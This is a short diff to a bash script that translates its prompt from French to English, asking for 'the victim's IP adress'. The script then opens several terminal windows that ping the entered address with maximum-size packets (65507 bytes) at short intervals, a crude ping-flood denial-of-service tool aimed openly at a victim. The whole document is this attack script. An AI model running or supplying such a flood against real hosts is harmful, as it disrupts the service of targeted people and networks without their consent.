@@ -1,5 +1,5 @@
 #!/bin/bash
-echo -e "Entrez l'IP de la victime :"
+echo -e "Enter the victim's IP adress:"
 read -p '> ' adress
 gnome-terminal -e "ping $adress -s 65507 -i 0.2"
 gnome-terminal -e "ping $adress -s 65507 -i 0.2"
